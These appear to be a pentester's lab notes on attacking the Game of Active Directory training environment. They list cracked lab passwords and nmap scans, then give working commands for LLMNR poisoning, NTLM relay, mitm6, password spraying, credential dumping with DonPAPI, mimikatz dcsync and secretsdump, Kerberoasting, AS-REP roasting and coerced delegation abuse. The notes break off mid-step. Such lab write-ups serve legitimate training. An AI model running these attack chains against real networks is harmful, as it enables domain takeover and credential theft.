Title: Game of Active Directory Notes
Slug: ad/goad
Date: 2025-02-01 00:00
Category: Active Directory

## Status

Recovered Passwords:

| User                            | Password                          |
| ------------------------------- | --------------------------------- |
| NORTH\robb.stark                | sexywolfy                         |
| NORTH\samwell.tarly             | Heartsbane                        |
| NORTH\jeor.mormont              | \_L0ngCl@w_                       |
| NORTH\jon.snow                  | iknownothing                      |
| NORTH\brandon.stark             | iseedeadpeople                    |
| NORTH\hodor                     | hodor                             |
| NORTH\arya.stark                | Needle                            |
| NORTH\eddard.stark              | FightP3aceAndHonor!               |
| NORTH\catelyn.stark             |                                   |
| NORTH\sansa.stark               |                                   |
| NORTH\rickon.stark              |                                   |
| NORTH\sql_svc<br>ESSOS\sql_svc  | YouWillNotKerboroast1ngMeeeeee    |
| SEVENKINGDOMS\cersei.lannister  | il0vejaime                        |
| SEVENKINGDOMS\robert.baratheon  | iamthekingoftheworld              |
| SEVENKINGDOMS\petyer.baelish    | @littlefinger@                    |
| SEVENKINGDOMS\joffrey.baratheon | 1killerlion                       |
| SEVENKINGDOMS\tywin.lannister   | powerkingftw135                   |
| SEVENKINGDOMS\jaime.lannister   | password123 (ForceChangePassword) |
| ESSOS.local\missandei           | fr3edom                           |
| ESSOS.local\khal.drogo          | horse                             |
| ESSOS.local\viserys.targaryen   | password123 (ForceChangePassword) |

## Initial Enumeration

~~~
# Nmap 7.95 scan initiated Tue Jan 28 09:36:12 2025 as: /usr/lib/nmap/nmap -sC -sV -iL targets.txt -oN common-port-scanning.nmap
    Nmap scan report for 10.1.0.10
    Host is up (0.00020s latency).
    Not shown: 985 closed tcp ports (reset)
    PORT     STATE SERVICE       VERSION
    53/tcp   open  domain        Simple DNS Plus
    80/tcp   open  http          Microsoft IIS httpd 10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-title: IIS Windows Server
    |_http-server-header: Microsoft-IIS/10.0
    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-28 09:36:26Z)
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:kingslanding.sevenkingdoms.local
    | Not valid before: 2024-10-19T20:43:32
    |_Not valid after:  2025-10-19T20:43:32
    |_ssl-date: 2025-01-28T09:37:34+00:00; 0s from scanner time.
    445/tcp  open  microsoft-ds?
    464/tcp  open  kpasswd5?
    593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:kingslanding.sevenkingdoms.local
    | Not valid before: 2024-10-19T20:43:32
    |_Not valid after:  2025-10-19T20:43:32
    |_ssl-date: 2025-01-28T09:37:34+00:00; 0s from scanner time.
    3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:kingslanding.sevenkingdoms.local
    | Not valid before: 2024-10-19T20:43:32
    |_Not valid after:  2025-10-19T20:43:32
    |_ssl-date: 2025-01-28T09:37:34+00:00; 0s from scanner time.
    3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:kingslanding.sevenkingdoms.local
    | Not valid before: 2024-10-19T20:43:32
    |_Not valid after:  2025-10-19T20:43:32
    |_ssl-date: 2025-01-28T09:37:34+00:00; 0s from scanner time.
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    |_ssl-date: 2025-01-28T09:37:34+00:00; 0s from scanner time.
    | ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
    | Not valid before: 2024-10-18T20:16:33
    |_Not valid after:  2025-04-19T20:16:33
    | rdp-ntlm-info: 
    |   Target_Name: SEVENKINGDOMS
    |   NetBIOS_Domain_Name: SEVENKINGDOMS
    |   NetBIOS_Computer_Name: KINGSLANDING
    |   DNS_Domain_Name: sevenkingdoms.local
    |   DNS_Computer_Name: kingslanding.sevenkingdoms.local
    |   DNS_Tree_Name: sevenkingdoms.local
    |   Product_Version: 10.0.17763
    |_  System_Time: 2025-01-28T09:37:26+00:00
    5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    | tls-alpn: 
    |_  http/1.1
    | ssl-cert: Subject: commonName=VAGRANT-2019
    | Subject Alternative Name: DNS:VAGRANT-2019, DNS:vagrant-2019
    | Not valid before: 2024-10-18T20:19:10
    |_Not valid after:  2027-10-18T20:19:10
    |_ssl-date: 2025-01-28T09:37:34+00:00; 0s from scanner time.
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    MAC Address: BC:24:11:35:AD:5F (Proxmox Server Solutions GmbH)
    Service Info: Host: KINGSLANDING; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-time: 
    |   date: 2025-01-28T09:37:23
    |_  start_date: N/A
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled and required
    |_nbstat: NetBIOS name: KINGSLANDING, NetBIOS user: <unknown>, NetBIOS MAC: bc:24:11:35:ad:5f (Proxmox Server Solutions GmbH)
~~~

~~~
    Nmap scan report for 10.1.0.11
    Host is up (0.00022s latency).
    Not shown: 986 closed tcp ports (reset)
    PORT     STATE SERVICE       VERSION
    53/tcp   open  domain        Simple DNS Plus
    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-28 09:36:25Z)
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:winterfell.north.sevenkingdoms.local
    | Not valid before: 2024-10-19T21:05:23
    |_Not valid after:  2025-10-19T21:05:23
    |_ssl-date: 2025-01-28T09:37:33+00:00; -1s from scanner time.
    445/tcp  open  microsoft-ds?
    464/tcp  open  kpasswd5?
    593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
    |_ssl-date: 2025-01-28T09:37:33+00:00; -1s from scanner time.
    | ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:winterfell.north.sevenkingdoms.local
    | Not valid before: 2024-10-19T21:05:23
    |_Not valid after:  2025-10-19T21:05:23
    3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
    |_ssl-date: 2025-01-28T09:37:33+00:00; -1s from scanner time.
    | ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:winterfell.north.sevenkingdoms.local
    | Not valid before: 2024-10-19T21:05:23
    |_Not valid after:  2025-10-19T21:05:23
    3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
    |_ssl-date: 2025-01-28T09:37:33+00:00; -1s from scanner time.
    | ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:winterfell.north.sevenkingdoms.local
    | Not valid before: 2024-10-19T21:05:23
    |_Not valid after:  2025-10-19T21:05:23
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    | rdp-ntlm-info: 
    |   Target_Name: NORTH
    |   NetBIOS_Domain_Name: NORTH
    |   NetBIOS_Computer_Name: WINTERFELL
    |   DNS_Domain_Name: north.sevenkingdoms.local
    |   DNS_Computer_Name: winterfell.north.sevenkingdoms.local
    |   DNS_Tree_Name: sevenkingdoms.local
    |   Product_Version: 10.0.17763
    |_  System_Time: 2025-01-28T09:37:24+00:00
    |_ssl-date: 2025-01-28T09:37:33+00:00; -1s from scanner time.
    | ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
    | Not valid before: 2024-10-18T20:27:06
    |_Not valid after:  2025-04-19T20:27:06
    5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_ssl-date: 2025-01-28T09:37:33+00:00; -1s from scanner time.
    | ssl-cert: Subject: commonName=VAGRANT-2019
    | Subject Alternative Name: DNS:VAGRANT-2019, DNS:vagrant-2019
    | Not valid before: 2024-10-18T20:19:10
    |_Not valid after:  2027-10-18T20:19:10
    | tls-alpn: 
    |_  http/1.1
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    MAC Address: BC:24:11:FF:FF:ED (Proxmox Server Solutions GmbH)
    Service Info: Host: WINTERFELL; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled and required
    |_nbstat: NetBIOS name: WINTERFELL, NetBIOS user: <unknown>, NetBIOS MAC: bc:24:11:ff:ff:ed (Proxmox Server Solutions GmbH)
    | smb2-time: 
    |   date: 2025-01-28T09:37:26
    |_  start_date: N/A
~~~

~~~
    Nmap scan report for 10.1.0.12
    Host is up (0.00023s latency).
    Not shown: 986 closed tcp ports (reset)
    PORT     STATE SERVICE       VERSION
    53/tcp   open  domain        Simple DNS Plus
    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-28 09:36:31Z)
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)
    445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: ESSOS)
    464/tcp  open  kpasswd5?
    593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp  open  tcpwrapped
    3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)
    3269/tcp open  tcpwrapped
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    | ssl-cert: Subject: commonName=GOAD-DC03.essos.local
    | Not valid before: 2024-11-26T20:23:50
    |_Not valid after:  2025-05-28T20:23:50
    |_ssl-date: 2025-01-28T09:37:34+00:00; 0s from scanner time.
    5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_ssl-date: 2025-01-28T09:37:34+00:00; 0s from scanner time.
    | ssl-cert: Subject: commonName=VAGRANT-2016
    | Subject Alternative Name: DNS:VAGRANT-2016, DNS:vagrant-2016
    | Not valid before: 2024-10-18T20:39:49
    |_Not valid after:  2027-10-18T20:39:49
    | tls-alpn: 
    |   h2
    |_  http/1.1
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    MAC Address: BC:24:11:2F:7C:2C (Proxmox Server Solutions GmbH)
    Service Info: Hosts: MEEREEN, GOAD-DC03; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled and required
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: required
    |_clock-skew: mean: -11m59s, deviation: 26m47s, median: 0s
    | smb-os-discovery: 
    |   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
    |   Computer name: GOAD-DC03
    |   NetBIOS computer name: GOAD-DC03\x00
    |   Domain name: essos.local
    |   Forest name: essos.local
    |   FQDN: GOAD-DC03.essos.local
    |_  System time: 2025-01-28T10:37:27+01:00
    |_nbstat: NetBIOS name: GOAD-DC03, NetBIOS user: <unknown>, NetBIOS MAC: bc:24:11:2f:7c:2c (Proxmox Server Solutions GmbH)
    | smb2-time: 
    |   date: 2025-01-28T09:37:27
    |_  start_date: 2025-01-28T09:29:33
~~~

~~~
    Nmap scan report for 10.1.0.22
    Host is up (0.00022s latency).
    Not shown: 992 closed tcp ports (reset)
    PORT     STATE SERVICE       VERSION
    80/tcp   open  http          Microsoft IIS httpd 10.0
    |_http-title: Site doesn't have a title (text/html).
    |_http-server-header: Microsoft-IIS/10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp  open  microsoft-ds?
    1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
    | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
    | Not valid before: 2025-01-28T09:29:58
    |_Not valid after:  2055-01-28T09:29:58
    |_ssl-date: 2025-01-28T09:37:33+00:00; -1s from scanner time.
    | ms-sql-ntlm-info: 
    |   10.1.0.22:1433: 
    |     Target_Name: NORTH
    |     NetBIOS_Domain_Name: NORTH
    |     NetBIOS_Computer_Name: GOAD-SRV02
    |     DNS_Domain_Name: north.sevenkingdoms.local
    |     DNS_Computer_Name: GOAD-SRV02.north.sevenkingdoms.local
    |     DNS_Tree_Name: sevenkingdoms.local
    |_    Product_Version: 10.0.17763
    | ms-sql-info: 
    |   10.1.0.22:1433: 
    |     Version: 
    |       name: Microsoft SQL Server 2019 RTM
    |       number: 15.00.2000.00
    |       Product: Microsoft SQL Server 2019
    |       Service pack level: RTM
    |       Post-SP patches applied: false
    |_    TCP port: 1433
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    | ssl-cert: Subject: commonName=GOAD-SRV02.north.sevenkingdoms.local
    | Not valid before: 2024-11-26T20:23:28
    |_Not valid after:  2025-05-28T20:23:28
    |_ssl-date: 2025-01-28T09:37:33+00:00; -1s from scanner time.
    5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    | tls-alpn: 
    |_  http/1.1
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    |_ssl-date: 2025-01-28T09:37:33+00:00; -1s from scanner time.
    | ssl-cert: Subject: commonName=VAGRANT-2019
    | Subject Alternative Name: DNS:VAGRANT-2019, DNS:vagrant-2019
    | Not valid before: 2024-10-18T20:19:10
    |_Not valid after:  2027-10-18T20:19:10
    MAC Address: BC:24:11:89:97:DF (Proxmox Server Solutions GmbH)
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2025-01-28T09:37:27
    |_  start_date: N/A
    |_nbstat: NetBIOS name: GOAD-SRV02, NetBIOS user: <unknown>, NetBIOS MAC: bc:24:11:89:97:df (Proxmox Server Solutions GmbH)
~~~

~~~
    Nmap scan report for 10.1.0.23
    Host is up (0.00024s latency).
    Not shown: 992 closed tcp ports (reset)
    PORT     STATE SERVICE       VERSION
    80/tcp   open  http          Microsoft IIS httpd 10.0
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: IIS Windows Server
    | http-methods: 
    |_  Potentially risky methods: TRACE
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
    1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
    | ms-sql-info: 
    |   10.1.0.23:1433: 
    |     Version: 
    |       name: Microsoft SQL Server 2019 RTM
    |       number: 15.00.2000.00
    |       Product: Microsoft SQL Server 2019
    |       Service pack level: RTM
    |       Post-SP patches applied: false
    |_    TCP port: 1433
    | ms-sql-ntlm-info: 
    |   10.1.0.23:1433: 
    |     Target_Name: ESSOS
    |     NetBIOS_Domain_Name: ESSOS
    |     NetBIOS_Computer_Name: GOAD-SRV03
    |     DNS_Domain_Name: essos.local
    |     DNS_Computer_Name: GOAD-SRV03.essos.local
    |     DNS_Tree_Name: essos.local
    |_    Product_Version: 10.0.14393
    | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
    | Not valid before: 2025-01-28T09:29:37
    |_Not valid after:  2055-01-28T09:29:37
    |_ssl-date: 2025-01-28T09:37:33+00:00; -1s from scanner time.
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    |_ssl-date: 2025-01-28T09:37:33+00:00; -1s from scanner time.
    | ssl-cert: Subject: commonName=GOAD-SRV03.essos.local
    | Not valid before: 2024-11-26T20:23:12
    |_Not valid after:  2025-05-28T20:23:12
    5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    | ssl-cert: Subject: commonName=VAGRANT-2016
    | Subject Alternative Name: DNS:VAGRANT-2016, DNS:vagrant-2016
    | Not valid before: 2024-10-18T20:39:49
    |_Not valid after:  2027-10-18T20:39:49
    |_ssl-date: 2025-01-28T09:37:33+00:00; -1s from scanner time.
    | tls-alpn: 
    |   h2
    |_  http/1.1
    MAC Address: BC:24:11:22:C2:5A (Proxmox Server Solutions GmbH)
    Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb-os-discovery: 
    |   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
    |   NetBIOS computer name: GOAD-SRV03\x00
    |   Workgroup: ESSOS\x00
    |_  System time: 2025-01-28T10:37:27+01:00
    |_clock-skew: mean: -8m34s, deviation: 22m38s, median: -1s
    |_nbstat: NetBIOS name: GOAD-SRV03, NetBIOS user: <unknown>, NetBIOS MAC: bc:24:11:22:c2:5a (Proxmox Server Solutions GmbH)
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled but not required
    | smb-security-mode: 
    |   account_used: <blank>
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-time: 
    |   date: 2025-01-28T09:37:27
    |_  start_date: 2025-01-28T09:29:31

    Post-scan script results:
    | clock-skew: 
    |   0s: 
    |     10.1.0.10
    |_    10.1.0.12
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 28 09:37:34 2025 -- 5 IP addresses (5 hosts up) scanned in 82.23 seconds
~~~

## Initial Attacks

### SMB Relay

~~~shell
nxc smb 10.1.0.0/24 --gen-relay-list relay_list.txt
~~~

Result:

~~~
10.1.0.23  
10.1.0.22
~~~

Start `responder`:

~~~shell
sudo ./Responder.py -I eth0 -v
~~~

SMB relay with `ntlmrelayx`:

~~~shell
impacket-ntlmrelayx -tf relay_list.txt -l dumps/loot -smb2support -socks --keep-relaying
~~~

![[north-llmnr-poisoning-smb-relay.png]]

### LLMNR Poisoning

Poison DNS and capture NTLMv2 hashes:

~~~
sudo ./Responder.py -I eth0 -v
~~~

![[north-llmnr-poisoning.png]]

Cracking the captured hashes:

~~~shell
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
~~~

Recovered the `robb.stark` password:

~~~
sexywolfy
~~~

### DNS takeover via IPv6

~~~
sudo mitm6 -d north.sevenkingdoms.local -d sevenkingdoms.local -d essos.local
~~~


**Attacking winterfell**

Dump loot:

~~~shell
impacket-ntlmrelayx -6 -wh attackerwpad.north.sevenkingdoms.local -t ldap://10.1.0.11 -l dumps/loot
~~~

![[north-mitm6-relay.png]]

**Cannot create backdoor user due to constraint failing!**
### Plaintext Password

After enumerating users with `robb.stark`, a cleartext password for user `samwell.tarly` is found in the description property:

![[north-users-enumetation.png]]

### Password Spraying
#### WINTERFELL

Using this [script](https://github.com/ojack69/jacks-corner/blob/main/scripts/PowerShell/PasswordSprayer.ps1), perform password spraying using the username as password:

~~~powershell
.\PasswordSprayer.ps1 -UsernameAsPassword
~~~

![[north-password-spraying.png]]

#### KINGSLANDING

Using this [script](https://github.com/ojack69/jacks-corner/blob/main/scripts/PowerShell/PasswordSprayer.ps1), perform password spraying using the secret decrypted in [[game-of-active-directory-notes#Shares Enumeration|Shares Enumeration]]:

~~~powershell
.\PasswordSprayer.ps1 -Password powerkingftw135
~~~

![[sevenkingdoms-password-spraying.png]]
## Credentials Dumping

### NORTH
#### DonPAPI

~~~shell
donpapi collect -u robb.stark -p sexywolfy -d NORTH.local -t 10.1.0.11
~~~

![[north-dumping-credentials-donPAPI.png]]

Using relayed credentials:

~~~shell
proxychains donpapi collect --no-pass -u eddard.stark -d NORTH -t 10.1.0.22
~~~

![[north-smb-relay-credential-dumping.png]]

By performing password spraying, the password `YouWillNotKerboroast1ngMeeeeee` belongs to `sql_svc`
#### Mimikatz

With `eddard.stark` (domain admin):

~~~
privilege::debug
lsadump::dcsync /user:arya.stark
~~~

Dumping NTLM hash: `4f622f4cd4284a887228940e2ff4e709`

![[north-dumping-credentials-mimikatz-cracking.png]]

### KINGSLANDING

Dump all secrets using golden ticket from [[game-of-active-directory-notes#Child domain to parent|Golden Ticket - Child domain to parent]]:

~~~shell
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass north.sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local
~~~

![[sevenkingdoms-secretdumps-with-golden-ticket.png]]

Crack dumped NTLM hashes with hashcat:

~~~shell
hashcat -m 1000 sam_kingslanding.txt /usr/share/wordlists/rockyou.txt
~~~

![[sevenkingdoms-sam-cracking.png]]

Cracked the following hashes:

~~~
cersei.lannister:c247f62516b53893c7addcf8c349954b:il0vejaime
robert.baratheon:9029cf007326107eb1c519c84ea60dbe:iamthekingoftheworld
petyer.baelish:6c439acfa121a821552568b086c8d210:@littlefinger@
joffrey.baratheon:3b60abbc25770511334b3829866b08f1:1killerlion
~~~

## Shares Enumeration

~~~shell
net share
~~~


![[north-shares-enumeration.png]]

An interesting share `NETLOGON` is found, containing two sensitive files:

- `script.ps1`: contains cleartext password for the user 

![[north-script-ps1-content.png]]


- `secret.ps1`: containing an encrypted secret but also the key.

![[north-secret-ps1-content.png]]

~~~powershell
# cypher script  
# $domain="sevenkingdoms.local"  
# $EncryptionKeyBytes = New-Object Byte[] 32  
# [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($EncryptionKeyBytes)  
# $EncryptionKeyBytes | Out-File "encryption.key"  
# $EncryptionKeyData = Get-Content "encryption.key"  
# Read-Host -AsSecureString | ConvertFrom-SecureString -Key $EncryptionKeyData | Out-File -FilePath "secret.encrypted"  
  
# secret stored :  
$keyData = 177, 252, 228, 64, 28, 91, 12, 201, 20, 91, 21, 139, 255, 65, 9, 247, 41, 55, 164, 28, 75, 132, 143, 71, 62, 191, 211, 61, 154, 61, 216, 91  
$secret="76492d1116743f0423413b16050a5345MgB8AGkAcwBDACsAUwArADIAcABRAEcARABnAGYAMwA3AEEAcgBFAEIAYQB2AEEAPQA9AHwAZQAwADgANAA2ADQAMABiADYANAAwADYANgA1ADcANgAxAGIAMQBhAGQANQBlAGYAYQBiADQAYQA2ADkAZgBlAGQAMQAzADAANQAyADUAMgAyADYANAA3ADAAZABiAGEAOAA0AGUAOQBkAGMAZABmAGEANAAyADkAZgAyADIAMwA="  
  
# T.L.
~~~

According to the [ConvertFrom-SecureString](https://learn.microsoft.com/it-it/powershell/module/microsoft.powershell.security/convertfrom-securestring?view=powershell-7.4) documentation, when providing a key, the **secure string** gets encrypted with AES.

Having the key, it's possible to recover the original secure string as follows:

~~~powershell
$keyData = 177, 252, 228, 64, 28, 91, 12, 201, 20, 91, 21, 139, 255, 65, 9, 247, 41, 55, 164, 28, 75, 132, 143, 71, 62, 191, 211, 61, 154, 61, 216, 91
$secret="76492d1116743f0423413b16050a5345MgB8AGkAcwBDACsAUwArADIAcABRAEcARABnAGYAMwA3AEEAcgBFAEIAYQB2AEEAPQA9AHwAZQAwADgANAA2ADQAMABiADYANAAwADYANgA1ADcANgAxAGIAMQBhAGQANQBlAGYAYQBiADQAYQA2ADkAZgBlAGQAMQAzADAAN  
QAyADUAMgAyADYANAA3ADAAZABiAGEAOAA0AGUAOQBkAGMAZABmAGEANAAyADkAZgAyADIAMwA="

$secureString=ConvertTo-SecureString -Key $keyData -String $secret
~~~

and then recover the plaintext value from the secure string as follows:

~~~powershell
(New-Object PSCredential 0, $secureString).GetNetworkCredential().Password
~~~

The result is:

~~~
powerkingftw135
~~~

## Roasting
### Kerberoasting

Enumerating SPNs:

~~~shell
setspn -T NORTH -Q */*
~~~

![[north-spns.png]]

Following steps have been conducted from a RDP session since a Kerberos error was being returned using Evil-WinRM:

![[north-kerberos-error.png]]

Requesting TGS for the three SPNs accounts

~~~powershell
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/eyrie.north.sevenkingdoms.local"
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "CIFS/thewall.north.sevenkingdoms.local"
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/castelblack.north.sevenkingdoms.local"
~~~

~~~shell
klist
~~~

![[north-kerberoasting-tickets.png]]

Dump tickets using `Invoke-Mimikatz`:

~~~powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
~~~

Convert kirbi tickets to john/hashcat format:

~~~shell
/usr/share/kerberoast/kirbi2john.py <kirbi ticket path> > <outputpath>
~~~

And crack each ticket with hashcat:

~~~shell
hashcat -m 13100 <ticket path> /usr/share/wordlists/rockyou.txt
~~~

The TGS for `CIFS/thewall.north.sevenkingdoms.local` gets successfully decrypted using rockyou:

![[north-kerbearoasting-cracking.png]]

User `NORTH\jon.snow`'s password is `iknownothing`.

### AS-REP Roasting

#### NORTH.SEVENKINGDOMS.LOCAL

Find AS-REP-roastable users:

~~~powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
~~~

![[north-asreproasting-users.png]]

Request TGS for `brandon.stark` using `Invoke-Rubeus`:

~~~powershell
Invoke-Rubeus -Command "asreproast /user:brandon.stark /nowrap"
~~~

![[north-asproasting-request-tgs.png]]

Crack TGS with hashcat:

~~~shell
hashcat -m 18200 <ticket> /usr/share/wordlists/rockyou.txt
~~~

![[north-asproasting-cracking.png]]

User `NORTH\brandon.stark`'s password is `iseedeadpeople`.

#### ESSOS.local

Find AS-REP-roastable users on `essos.local` abusing trust with `sevenkingdoms`:

~~~shell
nxc ldap essos.local -d SEVENKINGDOMS.local -u cersei.lannister -p il0vejaime --query "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" "samaccountname"
~~~

![[essos-asreproast-enum.png]]

Request TGS for `missandei` using Impacket's `GetNPUsers` anonymously:

~~~shell
impacket-GetNPUsers -no-pass essos.local/missandei
~~~

![[essos-asreproast.png]]

Crack the TGS with `hashcat`:

~~~shell
hashcat -m 18200 missandei.asreproast /usr/share/wordlists/rockyou.txt
~~~

![[essos-asreproast-crack.png]]

Password for `missandei` account is `fr3edom`.

## Delegation Attacks
### Unconstrained Delegation

Enumerate vulnerable computers:

~~~shell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
~~~

![[north-unconstrained-delegation-enum.png]]

Since winterfell is vulnerable and the attacker has control on this server, it's possible to complete the attack; the next step is to force another computer (the parent domain controller - kingslanding) to authenticate against the vulnerable host.

Check if kingslanding can be forced to connect to winterfell:

~~~shell
coercer scan -u robb.stark -p sexywolfy --target-ip 10.1.0.10
~~~

![[north-unconstrained-delegation-scan.png]]

On winterfell, llisten for new tickets in memory with `Rubeus`:

~~~mimikatz
Rubeus.exe monitor /interval:5 /nowrap
~~~

![[north-unconstrained-delegation-tgt-dump.png]]

Force kingslanding to connect to winterfell:

~~~shell
coercer coerce -u robb.stark -p sexywolfy --target-ip 10.1.0.10 --listener-ip 10.1.0.11
~~~

![[north-unconstrained-delegation-force-auth.png]]

Convert Base64 ticket to kirbi format to ccache format with Impacket's `ticketConverter`

~~~shell
base64 -w 0 -d kingslanding.b64 > kingslanding.kirbi
